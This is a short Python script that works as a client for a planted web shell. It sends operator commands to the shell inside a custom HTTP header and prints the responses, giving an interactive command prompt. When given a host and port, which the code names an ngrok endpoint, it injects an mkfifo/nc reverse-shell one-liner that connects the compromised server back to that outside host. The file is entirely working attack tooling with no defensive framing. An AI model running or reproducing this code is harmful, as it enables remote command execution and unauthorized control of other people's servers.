#!/usr/bin/env python3

from requests import get
import sys 

webshell = sys.argv[1]
header_name = sys.argv[2]

def connect(cmd):
    cmd = cmd
    headers = {header_name : cmd}
    r = get(webshell, headers=headers)
    print(r.text)

if(len(sys.argv) >= 4):
    ngrok = sys.argv[3]
    port = sys.argv[4]
    print(f'Connecting reverse shell {ngrok}:{port} in {webshell}')
    cmd = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ngrok} {port} >/tmp/f'
    connect(cmd)

else:
    cmd = ''

    print(f'Connecting to {webshell} (type "exit" to leave)', end='\n')
    while(cmd != 'exit'):
        cmd = input('$ ')
        connect(cmd)
    print('Bye!')

